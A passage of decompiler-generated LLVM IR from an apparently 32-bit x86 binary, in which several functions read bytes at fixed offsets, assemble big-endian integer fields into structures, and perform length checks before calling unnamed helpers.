  %v2_8051d50 = mul nuw nsw i32 %v4_8051d48, 256
  %v2_8051d53 = or i32 %v4_8051d4c, %v2_8051d50
  %v1_8051d55 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d55 = add i32 %v1_8051d55, 32
  %v3_8051d55 = inttoptr i32 %v2_8051d55 to i32*
  store i32 %v2_8051d53, i32* %v3_8051d55, align 4
  %v0_8051d58 = load i32, i32* @ecx, align 4
  %v1_8051d58 = add i32 %v0_8051d58, 6
  %v2_8051d58 = inttoptr i32 %v1_8051d58 to i8*
  %v3_8051d58 = load i8, i8* %v2_8051d58, align 1
  %v4_8051d58 = zext i8 %v3_8051d58 to i32
  %v1_8051d5c = add i32 %v0_8051d58, 7
  %v2_8051d5c = inttoptr i32 %v1_8051d5c to i8*
  %v3_8051d5c = load i8, i8* %v2_8051d5c, align 1
  %v4_8051d5c = zext i8 %v3_8051d5c to i32
  %v2_8051d60 = mul nuw nsw i32 %v4_8051d58, 256
  %v2_8051d63 = or i32 %v4_8051d5c, %v2_8051d60
  %v1_8051d65 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d65 = add i32 %v1_8051d65, 36
  %v3_8051d65 = inttoptr i32 %v2_8051d65 to i32*
  store i32 %v2_8051d63, i32* %v3_8051d65, align 4
  %v0_8051d68 = load i32, i32* @ecx, align 4
  %v1_8051d68 = add i32 %v0_8051d68, 8
  %v2_8051d68 = inttoptr i32 %v1_8051d68 to i8*
  %v3_8051d68 = load i8, i8* %v2_8051d68, align 1
  %v4_8051d68 = zext i8 %v3_8051d68 to i32
  %v1_8051d6c = add i32 %v0_8051d68, 9
  %v2_8051d6c = inttoptr i32 %v1_8051d6c to i8*
  %v3_8051d6c = load i8, i8* %v2_8051d6c, align 1
  %v4_8051d6c = zext i8 %v3_8051d6c to i32
  %v2_8051d70 = mul nuw nsw i32 %v4_8051d68, 256
  %v2_8051d73 = or i32 %v4_8051d6c, %v2_8051d70
  %v1_8051d75 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d75 = add i32 %v1_8051d75, 40
  %v3_8051d75 = inttoptr i32 %v2_8051d75 to i32*
  store i32 %v2_8051d73, i32* %v3_8051d75, align 4
  %v0_8051d78 = load i32, i32* @ecx, align 4
  %v1_8051d78 = add i32 %v0_8051d78, 10
  %v2_8051d78 = inttoptr i32 %v1_8051d78 to i8*
  %v3_8051d78 = load i8, i8* %v2_8051d78, align 1
  %v4_8051d78 = zext i8 %v3_8051d78 to i32
  %v1_8051d7c = add i32 %v0_8051d78, 11
  %v2_8051d7c = inttoptr i32 %v1_8051d7c to i8*
  %v3_8051d7c = load i8, i8* %v2_8051d7c, align 1
  %v4_8051d7c = zext i8 %v3_8051d7c to i32
  %v2_8051d80 = mul nuw nsw i32 %v4_8051d78, 256
  %v2_8051d83 = or i32 %v4_8051d7c, %v2_8051d80
  %v1_8051d85 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d85 = add i32 %v1_8051d85, 44
  %v3_8051d85 = inttoptr i32 %v2_8051d85 to i32*
  store i32 %v2_8051d83, i32* %v3_8051d85, align 4
  %v2_8051d8d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051d8d, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 6, 7, 2, 3, 5, 8, 4, 1, 9, 10, 0 }
  uselistorder i32 40, { 4, 5, 10, 6, 7, 8, 9, 1, 3, 11, 12, 13, 14, 2, 0 }
  uselistorder i32 7, { 7, 8, 1, 3, 5, 2, 0, 6, 10, 11, 12, 13, 9, 4 }
  uselistorder i32 6, { 14, 15, 2, 3, 17, 18, 0, 6, 10, 8, 9, 7, 16, 19, 20, 4, 1, 5, 11, 12, 13 }
  uselistorder i32 28, { 10, 11, 8, 9, 24, 28, 37, 19, 12, 13, 2, 14, 15, 16, 17, 18, 3, 4, 5, 0, 29, 7, 20, 25, 26, 21, 22, 30, 31, 32, 33, 34, 35, 1, 36, 38, 27, 6, 23 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 18, 5, 13, 19, 14, 6, 15, 7, 8, 9, 10, 16, 17, 11, 12 }
  uselistorder i8 4, { 0, 2, 1, 3, 4 }
  uselistorder i8 8, { 0, 2, 4, 3, 5, 1, 6, 7 }
}

define i32 @function_8051d90() local_unnamed_addr {
dec_label_pc_8051d90:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8051d90 = load i32, i32* @edi, align 4
  %v0_8051d91 = load i32, i32* @esi, align 4
  %v0_8051d92 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d92, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8051d9f = load i32, i32* @eax, align 4
  %v1_8051da2 = inttoptr i32 %tmp3 to i32*
  %v2_8051da2 = load i32, i32* %v1_8051da2, align 4
  %v7_8051da4 = inttoptr i32 %v2_8051da2 to i8*
  %v8_8051da4 = call i32 @function_80522e0(i8* %v7_8051da4, i32 %tmp2, i32 %tmp, i32 %v0_8051d9f, i32 %v0_8051d92, i32 %v0_8051d91, i32 %v0_8051d90)
  store i32 %v8_8051da4, i32* @ecx, align 4
  %v2_8051dae = icmp slt i32 %v8_8051da4, 0
  br i1 %v2_8051dae, label %dec_label_pc_8051ddd, label %dec_label_pc_8051db2

dec_label_pc_8051db2:                             ; preds = %dec_label_pc_8051d90
  %v0_8051db2 = load i32, i32* @ebx, align 4
  %v2_8051db2 = sub i32 %v0_8051db2, %v8_8051da4
  %v1_8051db4 = add i32 %v2_8051db2, -3
  %v6_8051db4 = sub i32 2, %v2_8051db2
  %v7_8051db4 = and i32 %v6_8051db4, %v2_8051db2
  %v8_8051db4 = icmp slt i32 %v7_8051db4, 0
  %v9_8051db4 = icmp eq i32 %v1_8051db4, 0
  %v10_8051db4 = icmp slt i32 %v1_8051db4, 0
  %v3_8051db7 = icmp eq i1 %v10_8051db4, %v8_8051db4
  %v4_8051db7 = icmp eq i1 %v9_8051db4, false
  %v5_8051db7 = and i1 %v4_8051db7, %v3_8051db7
  br i1 %v5_8051db7, label %dec_label_pc_8051dbe, label %dec_label_pc_8051db9

dec_label_pc_8051db9:                             ; preds = %dec_label_pc_8051db2
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8051ddd

dec_label_pc_8051dbe:                             ; preds = %dec_label_pc_8051db2
  %v0_8051dbe = load i32, i32* @edi, align 4
  %v2_8051dbe = add i32 %v0_8051dbe, %v8_8051da4
  store i32 %v2_8051dbe, i32* @edx, align 4
  %v1_8051dc1 = add i32 %v8_8051da4, 4
  store i32 %v1_8051dc1, i32* @ecx, align 4
  %v0_8051dc4 = load i32, i32* @esi, align 4
  %v1_8051dc4 = add i32 %v0_8051dc4, 5
  %v2_8051dc4 = inttoptr i32 %v1_8051dc4 to i8*
  %v3_8051dc4 = load i8, i8* %v2_8051dc4, align 1
  %v3_8051dc8 = inttoptr i32 %v2_8051dbe to i8*
  store i8 %v3_8051dc4, i8* %v3_8051dc8, align 1
  %v0_8051dca = load i32, i32* @esi, align 4
  %v1_8051dca = add i32 %v0_8051dca, 4
  %v2_8051dca = inttoptr i32 %v1_8051dca to i32*
  %v3_8051dca = load i32, i32* %v2_8051dca, align 4
  %v1_8051dcd = trunc i32 %v3_8051dca to i8
  %v2_8051dcd = load i32, i32* @edx, align 4
  %v3_8051dcd = add i32 %v2_8051dcd, 1
  %v4_8051dcd = inttoptr i32 %v3_8051dcd to i8*
  store i8 %v1_8051dcd, i8* %v4_8051dcd, align 1
  %v0_8051dd0 = load i32, i32* @esi, align 4
  %v1_8051dd0 = add i32 %v0_8051dd0, 9
  %v2_8051dd0 = inttoptr i32 %v1_8051dd0 to i8*
  %v3_8051dd0 = load i8, i8* %v2_8051dd0, align 1
  %v2_8051dd4 = load i32, i32* @edx, align 4
  %v3_8051dd4 = add i32 %v2_8051dd4, 2
  %v4_8051dd4 = inttoptr i32 %v3_8051dd4 to i8*
  store i8 %v3_8051dd0, i8* %v4_8051dd4, align 1
  %v0_8051dd7 = load i32, i32* @esi, align 4
  %v1_8051dd7 = add i32 %v0_8051dd7, 8
  %v2_8051dd7 = inttoptr i32 %v1_8051dd7 to i32*
  %v3_8051dd7 = load i32, i32* %v2_8051dd7, align 4
  %v1_8051dda = trunc i32 %v3_8051dd7 to i8
  %v2_8051dda = load i32, i32* @edx, align 4
  %v3_8051dda = add i32 %v2_8051dda, 3
  %v4_8051dda = inttoptr i32 %v3_8051dda to i8*
  store i8 %v1_8051dda, i8* %v4_8051dda, align 1
  %v0_8051ddd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051ddd

dec_label_pc_8051ddd:                             ; preds = %dec_label_pc_8051d90, %dec_label_pc_8051db9, %dec_label_pc_8051dbe
  %v0_8051ddd = phi i32 [ %v8_8051da4, %dec_label_pc_8051d90 ], [ -1, %dec_label_pc_8051db9 ], [ %v0_8051ddd.pre, %dec_label_pc_8051dbe ]
  %v2_8051ddf = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ddf, i32* @ebx, align 4
  store i32 %v0_8051d90, i32* @edi, align 4
  ret i32 %v0_8051ddd

; uselistorder directives
  uselistorder i32 %v1_8051db4, { 1, 0 }
  uselistorder i32 %v2_8051db2, { 0, 2, 1 }
  uselistorder i32 %v8_8051da4, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 4, 0 }
  uselistorder label %dec_label_pc_8051ddd, { 2, 1, 0 }
}

define i32 @function_8051de4() local_unnamed_addr {
dec_label_pc_8051de4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8051def = call i32 @function_8052448(i32 %tmp, i32 %tmp2)
  %v2_8051df7 = icmp slt i32 %v2_8051def, 0
  br i1 %v2_8051df7, label %dec_label_pc_8051dfe, label %dec_label_pc_8051dfb

dec_label_pc_8051dfb:                             ; preds = %dec_label_pc_8051de4
  %v1_8051dfb = add i32 %v2_8051def, 4
  br label %dec_label_pc_8051dfe

dec_label_pc_8051dfe:                             ; preds = %dec_label_pc_8051de4, %dec_label_pc_8051dfb
  %v0_8051e01 = phi i32 [ %v2_8051def, %dec_label_pc_8051de4 ], [ %v1_8051dfb, %dec_label_pc_8051dfb ]
  ret i32 %v0_8051e01

; uselistorder directives
  uselistorder label %dec_label_pc_8051dfe, { 1, 0 }
}

define i32 @function_8051e04() local_unnamed_addr {
dec_label_pc_8051e04:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051e04 = load i32, i32* @ebp, align 4
  %v0_8051e05 = load i32, i32* @edi, align 4
  %v0_8051e06 = load i32, i32* @esi, align 4
  %v0_8051e07 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e07, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8051e28 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8051e35 = call i32 @function_8052370(i32 %tmp4, i32 %tmp7, i32 %v2_8051e28, i32 256)
  store i32 %v4_8051e35, i32* @edi, align 4
  %v3_8051e3f = icmp slt i32 %v4_8051e35, 0
  br i1 %v3_8051e3f, label %dec_label_pc_8051ef0, label %dec_label_pc_8051e47

dec_label_pc_8051e47:                             ; preds = %dec_label_pc_8051e04
  %v0_8051e47 = load i32, i32* @ebx, align 4
  %v3_8051e47 = add i32 %v0_8051e47, %v4_8051e35
  %v0_8051e49 = load i32, i32* @esi, align 4
  %v2_8051e49 = sub i32 %v0_8051e49, %v3_8051e47
  %v1_8051e4f = add i32 %v2_8051e49, -10
  %v10_8051e4f = icmp slt i32 %v1_8051e4f, 0
  store i32 %v1_8051e4f, i32* @esi, align 4
  %v1_8051e56 = icmp eq i1 %v10_8051e4f, false
  br i1 %v1_8051e56, label %dec_label_pc_8051e5f, label %dec_label_pc_8051e58

dec_label_pc_8051e58:                             ; preds = %dec_label_pc_8051e47
  br label %dec_label_pc_8051ef0

dec_label_pc_8051e5f:                             ; preds = %dec_label_pc_8051e47
  %v6_8051e66 = add i32 %v3_8051e47, %tmp4
  store i32 %v6_8051e66, i32* @ebx, align 4
  %v1_8051e72 = call i32 @function_804d32c(i32 %v2_8051e28)
  %v1_8051e77 = load i32, i32* @ebp, align 4
  %v2_8051e77 = inttoptr i32 %v1_8051e77 to i32*
  store i32 %v1_8051e72, i32* %v2_8051e77, align 4
  %v0_8051e7a = load i32, i32* @ebx, align 4
  %v1_8051e7a = add i32 %v0_8051e7a, 4
  store i32 %v1_8051e7a, i32* %esi.global-to-local, align 4
  %v1_8051e7d = inttoptr i32 %v0_8051e7a to i8*
  %v2_8051e7d = load i8, i8* %v1_8051e7d, align 1
  %v3_8051e7d = zext i8 %v2_8051e7d to i32
  %v1_8051e80 = add i32 %v0_8051e7a, 1
  %v2_8051e80 = inttoptr i32 %v1_8051e80 to i8*
  %v3_8051e80 = load i8, i8* %v2_8051e80, align 1
  %v4_8051e80 = zext i8 %v3_8051e80 to i32
  %v2_8051e84 = mul nuw nsw i32 %v3_8051e7d, 256
  %v2_8051e87 = or i32 %v4_8051e80, %v2_8051e84
  %v1_8051e89 = load i32, i32* @ebp, align 4
  %v2_8051e89 = add i32 %v1_8051e89, 4
  %v3_8051e89 = inttoptr i32 %v2_8051e89 to i32*
  store i32 %v2_8051e87, i32* %v3_8051e89, align 4
  %v0_8051e8c = load i32, i32* @ebx, align 4
  %v1_8051e8c = add i32 %v0_8051e8c, 2
  %v2_8051e8c = inttoptr i32 %v1_8051e8c to i8*
  %v3_8051e8c = load i8, i8* %v2_8051e8c, align 1
  %v4_8051e8c = zext i8 %v3_8051e8c to i32
  %v1_8051e90 = add i32 %v0_8051e8c, 3
  %v2_8051e90 = inttoptr i32 %v1_8051e90 to i8*
  %v3_8051e90 = load i8, i8* %v2_8051e90, align 1
  %v4_8051e90 = zext i8 %v3_8051e90 to i32
  %v2_8051e94 = mul nuw nsw i32 %v4_8051e8c, 256
  %v2_8051e97 = or i32 %v4_8051e90, %v2_8051e94
  %v1_8051e99 = load i32, i32* @ebp, align 4
  %v2_8051e99 = add i32 %v1_8051e99, 8
  %v3_8051e99 = inttoptr i32 %v2_8051e99 to i32*
  store i32 %v2_8051e97, i32* %v3_8051e99, align 4
  %v0_8051e9c = load i32, i32* @ebx, align 4
  %v1_8051e9c = add i32 %v0_8051e9c, 4
  %v2_8051e9c = inttoptr i32 %v1_8051e9c to i8*
  %v3_8051e9c = load i8, i8* %v2_8051e9c, align 1
  %v4_8051e9c = zext i8 %v3_8051e9c to i32
  %v0_8051ea0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ea0 = add i32 %v0_8051ea0, 1
  %v2_8051ea0 = inttoptr i32 %v1_8051ea0 to i8*
  %v3_8051ea0 = load i8, i8* %v2_8051ea0, align 1
  %v4_8051ea0 = zext i8 %v3_8051ea0 to i32
  %v2_8051ea4 = mul nuw i32 %v4_8051e9c, 16777216
  %v2_8051ea7 = mul nuw nsw i32 %v4_8051ea0, 65536
  %v1_8051eaa = add i32 %v0_8051ea0, 2
  %v2_8051eaa = inttoptr i32 %v1_8051eaa to i8*
  %v3_8051eaa = load i8, i8* %v2_8051eaa, align 1
  %v4_8051eaa = zext i8 %v3_8051eaa to i32
  %v2_8051eae = mul nuw nsw i32 %v4_8051eaa, 256
  %v2_8051eb1 = or i32 %v2_8051ea7, %v2_8051ea4
  %v1_8051eb3 = add i32 %v0_8051ea0, 3
  %v2_8051eb3 = inttoptr i32 %v1_8051eb3 to i8*
  %v3_8051eb3 = load i8, i8* %v2_8051eb3, align 1
  %v4_8051eb3 = zext i8 %v3_8051eb3 to i32
  %v2_8051eb7 = or i32 %v4_8051eb3, %v2_8051eb1
  %v2_8051eb9 = or i32 %v2_8051eb7, %v2_8051eae
  store i32 %v2_8051eb9, i32* @ecx, align 4
  %v1_8051ebb = load i32, i32* @ebp, align 4
  %v2_8051ebb = add i32 %v1_8051ebb, 12
  %v3_8051ebb = inttoptr i32 %v2_8051ebb to i32*
  store i32 %v2_8051eb9, i32* %v3_8051ebb, align 4
  %v0_8051ebe = load i32, i32* @ebx, align 4
  %v1_8051ebe = add i32 %v0_8051ebe, 8
  %v2_8051ebe = inttoptr i32 %v1_8051ebe to i8*
  %v3_8051ebe = load i8, i8* %v2_8051ebe, align 1
  %v4_8051ebe = zext i8 %v3_8051ebe to i32
  %v1_8051ec2 = add i32 %v0_8051ebe, 9
  %v2_8051ec2 = inttoptr i32 %v1_8051ec2 to i8*
  %v3_8051ec2 = load i8, i8* %v2_8051ec2, align 1
  %v4_8051ec2 = zext i8 %v3_8051ec2 to i32
  %v2_8051ec6 = mul nuw nsw i32 %v4_8051ebe, 256
  %v1_8051ec9 = add i32 %v0_8051ebe, 10
  %v2_8051ecc = or i32 %v4_8051ec2, %v2_8051ec6
  store i32 %v2_8051ecc, i32* @edx, align 4
  %v1_8051ece = load i32, i32* @ebp, align 4
  %v2_8051ece = add i32 %v1_8051ece, 20
  %v3_8051ece = inttoptr i32 %v2_8051ece to i32*
  store i32 %v1_8051ec9, i32* %v3_8051ece, align 4
  %v0_8051ed1 = load i32, i32* @edx, align 4
  %v1_8051ed1 = load i32, i32* @ebp, align 4
  %v2_8051ed1 = add i32 %v1_8051ed1, 16
  %v3_8051ed1 = inttoptr i32 %v2_8051ed1 to i32*
  store i32 %v0_8051ed1, i32* %v3_8051ed1, align 4
  %v1_8051edb = add i32 %v3_8051e47, 10
  %v1_8051ede = load i32, i32* @ebp, align 4
  %v2_8051ede = add i32 %v1_8051ede, 24
  %v3_8051ede = inttoptr i32 %v2_8051ede to i32*
  store i32 %v1_8051edb, i32* %v3_8051ede, align 4
  %v4_8051ee1 = load i32, i32* @edx, align 4
  %v5_8051ee5 = icmp slt i32 %v1_8051e4f, %v4_8051ee1
  br i1 %v5_8051ee5, label %dec_label_pc_8051ee7, label %dec_label_pc_8051eec

dec_label_pc_8051ee7:                             ; preds = %dec_label_pc_8051e5f
  br label %dec_label_pc_8051ef0

dec_label_pc_8051eec:                             ; preds = %dec_label_pc_8051e5f
  %v1_8051eec = load i32, i32* @edi, align 4
  %v2_8051eec = add i32 %v4_8051ee1, 10
  %v3_8051eec = add i32 %v2_8051eec, %v1_8051eec
  br label %dec_label_pc_8051ef0

dec_label_pc_8051ef0:                             ; preds = %dec_label_pc_8051e04, %dec_label_pc_8051ee7, %dec_label_pc_8051e58, %dec_label_pc_8051eec
  %v0_8051ef6 = phi i32 [ %v4_8051e35, %dec_label_pc_8051e04 ], [ -1, %dec_label_pc_8051ee7 ], [ %v1_8051e4f, %dec_label_pc_8051e58 ], [ %v3_8051eec, %dec_label_pc_8051eec ]
  %v2_8051ef8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051ef8, i32* @ebx, align 4
  store i32 %v0_8051e06, i32* @esi, align 4
  store i32 %v0_8051e05, i32* @edi, align 4
  store i32 %v0_8051e04, i32* @ebp, align 4
  ret i32 %v0_8051ef6

; uselistorder directives
  uselistorder i32 %v1_8051e4f, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8051e47, { 1, 0, 2 }
  uselistorder i32 %v4_8051e35, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8051e28, { 1, 0 }
  uselistorder i32 24, { 5, 6, 13, 0, 7, 8, 9, 14, 2, 3, 12, 4, 10, 15, 16, 17, 18, 19, 20, 21, 22, 1, 11 }
  uselistorder i32 20, { 17, 18, 19, 22, 4, 26, 20, 7, 21, 23, 24, 5, 27, 28, 2, 9, 10, 12, 11, 29, 30, 31, 0, 32, 1, 33, 8, 34, 35, 36, 25, 13, 14, 6, 15, 16, 3 }
  uselistorder i32 9, { 7, 8, 9, 10, 1, 11, 2, 12, 13, 0, 3, 14, 15, 16, 17, 4, 5, 6 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 13, 11, 14, 12, 16, 15, 17, 19, 18 }
  uselistorder i32 3, { 33, 34, 35, 36, 37, 38, 20, 4, 21, 16, 41, 7, 39, 22, 9, 8, 5, 1, 2, 0, 23, 6, 24, 31, 17, 25, 10, 32, 26, 40, 18, 19, 27, 11, 15, 13, 14, 12, 3, 28, 29, 30 }
  uselistorder i32 (i32)* @function_804d32c, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder label %dec_label_pc_8051ef0, { 3, 1, 2, 0 }
}

define i32 @function_8051f00() local_unnamed_addr {
dec_label_pc_8051f00:
  %v3_8051f0d = call i32 @function_804b888(i32 ptrtoint ([11 x i8]* @global_var_8054cc5.211 to i32), i32 ptrtoint (i32* @global_var_8054c90.199 to i32))
  store i32 %v3_8051f0d, i32* @eax, align 4
  %v1_8051f15 = icmp eq i32 %v3_8051f0d, 0
  %v1_8051f17 = icmp eq i1 %v1_8051f15, false
  br i1 %v1_8051f17, label %dec_label_pc_8051f2d, label %dec_label_pc_8051f19

dec_label_pc_8051f19:                             ; preds = %dec_label_pc_8051f00
  %v3_8051f25 = call i32 @function_804b888(i32 ptrtoint ([18 x i8]* @global_var_8054cd0.212 to i32), i32 ptrtoint (i32* @global_var_8054c90.199 to i32))
  br label %dec_label_pc_8051f2d

dec_label_pc_8051f2d:                             ; preds = %dec_label_pc_8051f00, %dec_label_pc_8051f19
  %v0_8051f30 = phi i32 [ %v3_8051f0d, %dec_label_pc_8051f00 ], [ %v3_8051f25, %dec_label_pc_8051f19 ]
  ret i32 %v0_8051f30

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804b888, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8054c90.199 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8051f2d, { 1, 0 }
}

define i32 @function_8051f31(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_8051f31:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8051f31 = load i32, i32* @ebp, align 4
  %v0_8051f32 = load i32, i32* @edi, align 4
  %v0_8051f33 = load i32, i32* @esi, align 4
  %v0_8051f34 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8051f42 = sub i32 0, %arg6
  %v1_8051f44 = urem i32 %v1_8051f42, 4
  %v2_8051f44 = icmp eq i32 %v1_8051f44, 0
  store i32 %v1_8051f44, i32* %eax.global-to-local, align 4
  br i1 %v2_8051f44, label %dec_label_pc_8051f55, label %dec_label_pc_8051f49

dec_label_pc_8051f49:                             ; preds = %dec_label_pc_8051f31
  %v2_8051f49 = sub i32 %arg7, %v1_8051f44
  %v7_8051f49 = icmp ugt i32 %v1_8051f44, %arg7
  br i1 %v7_8051f49, label %dec_label_pc_80521f9, label %dec_label_pc_8051f51

dec_label_pc_8051f51:                             ; preds = %dec_label_pc_8051f49
  %v2_8051f51 = add i32 %v1_8051f44, %arg6
  store i32 %v2_8051f51, i32* @ebx, align 4
  store i32 %v2_8051f49, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051f55

dec_label_pc_8051f55:                             ; preds = %dec_label_pc_8051f31, %dec_label_pc_8051f51
  %v0_8051f5e = phi i32 [ %arg6, %dec_label_pc_8051f31 ], [ %v2_8051f51, %dec_label_pc_8051f51 ]
  %v0_8051f61 = phi i32 [ %arg7, %dec_label_pc_8051f31 ], [ %v2_8051f49, %dec_label_pc_8051f51 ]
  %tmp149 = icmp ult i32 %v0_8051f61, 32
  br i1 %tmp149, label %dec_label_pc_80521f9, label %dec_label_pc_8051f5e

dec_label_pc_8051f5e:                             ; preds = %dec_label_pc_8051f55
  %v1_8051f5e = add i32 %v0_8051f5e, 32
  store i32 %v1_8051f5e, i32* %eax.global-to-local, align 4
  %v1_8051f61 = add i32 %v0_8051f61, -32
  store i32 %v1_8051f61, i32* @ebp, align 4
  %v5_8051f64 = inttoptr i32 %v1_8051f5e to i8*
  %v12_8051f68 = icmp eq i32 %arg4, 1
  br i1 %v12_8051f68, label %dec_label_pc_805208a, label %dec_label_pc_8051f73

dec_label_pc_8051f73:                             ; preds = %dec_label_pc_8051f5e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8051f7a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8051f7a, align 4
  %tmp150 = icmp ult i32 %v1_8051f61, 4
  br i1 %tmp150, label %dec_label_pc_80521f9, label %dec_label_pc_8051f86

dec_label_pc_8051f86:                             ; preds = %dec_label_pc_8051f73
  %v0_8051f86 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051f86 = add i32 %v0_8051f86, -36
  store i32 %v1_8051f86, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_8051f86, 8
  br i1 %tmp151, label %dec_label_pc_80521f9, label %dec_label_pc_8051f92

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f86
  %v0_8051f92 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_8051f92, 16
  br i1 %tmp152, label %dec_label_pc_80521f9, label %dec_label_pc_8051f9b

dec_label_pc_8051f9b:                             ; preds = %dec_label_pc_8051f92
  %v1_8051f9b = add i32 %v0_8051f86, -48
  store i32 %v1_8051f9b, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_8051f9b, 8
  br i1 %tmp153, label %dec_label_pc_80521f9, label %dec_label_pc_8051fa7

dec_label_pc_8051fa7:                             ; preds = %dec_label_pc_8051f9b
  %v0_8051fa7 = load i32, i32* @ebx, align 4
  %v1_8051fa7 = add i32 %v0_8051fa7, 48
  %v1_8051faa = add i32 %v0_8051f86, -44
  store i32 %v1_8051faa, i32* @ebp, align 4
  %v1_8051fb1 = add i32 %v0_8051f86, -56
  store i32 %v1_8051fb1, i32* @eax, align 4
  %v1_8051fb4 = add i32 %v0_8051fa7, 36
  store i32 %v1_8051fb4, i32* @edi, align 4
  %v7_8051fb7 = icmp ult i32 %v1_8051fb1, %v1_8051faa
  br i1 %v7_8051fb7, label %dec_label_pc_8051fc0, label %dec_label_pc_8051fbb

dec_label_pc_8051fbb:                             ; preds = %dec_label_pc_8051fa7
  %v1_8051fbb = add i32 %v0_8051fa7, 44
  store i32 %v1_8051fbb, i32* @esi, align 4
  br label %dec_label_pc_8051fc5

dec_label_pc_8051fc0:                             ; preds = %dec_label_pc_8051fa7
  %v1_8051fc0 = add i32 %v0_8051fa7, 56
  store i32 %v1_8051fc0, i32* @esi, align 4
  store i32 %v1_8051fb1, i32* @ebp, align 4
  br label %dec_label_pc_8051fc5

dec_label_pc_8051fc5:                             ; preds = %dec_label_pc_8051fbb, %dec_label_pc_8051fc0
  %v0_8051fc5 = phi i32 [ %v1_8051faa, %dec_label_pc_8051fbb ], [ %v1_8051fb1, %dec_label_pc_8051fc0 ]
  %tmp154 = icmp ult i32 %v0_8051fc5, 80
  br i1 %tmp154, label %dec_label_pc_80521f9, label %dec_label_pc_8051fce

dec_label_pc_8051fce:                             ; preds = %dec_label_pc_8051fc5
  %v0_8051fce = call i32 @function_8051f00()
  store i32 %v0_8051fce, i32* %eax.global-to-local, align 4
  %v1_8051fd7 = icmp eq i32 %v0_8051fce, 0
  br i1 %v1_8051fd7, label %dec_label_pc_8051ffb, label %dec_label_pc_8051fdb

dec_label_pc_8051fdb:                             ; preds = %dec_label_pc_8051fce
  store i32 %v1_8051f5e, i32* %edx.global-to-local, align 4
  store i32 %v1_8051fa7, i32* %eax.global-to-local, align 4
  store i8* %v5_8051f64, i8** %stack_var_-44, align 4
  %v0_8051fe6 = load i32, i32* @edi, align 4
  %v0_8051ff2 = load i32, i32* @esi, align 4
  %v5_8051ff2 = inttoptr i32 %v0_8051ff2 to i8*
  br label %dec_label_pc_80520a9

dec_label_pc_8051ffb:                             ; preds = %dec_label_pc_8051fce
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8051fff = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8051fff, align 4
  %v1_8052005 = call i32 @function_804b774(i32 0)
  store i32 %v1_8052005, i32* %eax.global-to-local, align 4
  %v1_805200a = inttoptr i32 %v1_8052005 to i32*
  %v2_805200a = load i32, i32* %v1_805200a, align 4
  store i32 %v2_805200a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80521f9

dec_label_pc_8052015:                             ; preds = %dec_label_pc_805217c
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8052019 = load i8*, i8** %stack_var_-44, align 4
  %v3_8052019 = ptrtoint i8* %v2_8052019 to i32
  %v2_805201c = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8052019, i32* %v2_805201c, align 4
  %v0_805201e = load i32, i32* %eax.global-to-local, align 4
  %v1_805201e = add i32 %v0_805201e, 4
  %v2_805201e = inttoptr i32 %v1_805201e to i32*
  store i32 0, i32* %v2_805201e, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8052029 = load i32, i32* @ebx, align 4
  %v1_8052029 = add i32 %v0_8052029, 4
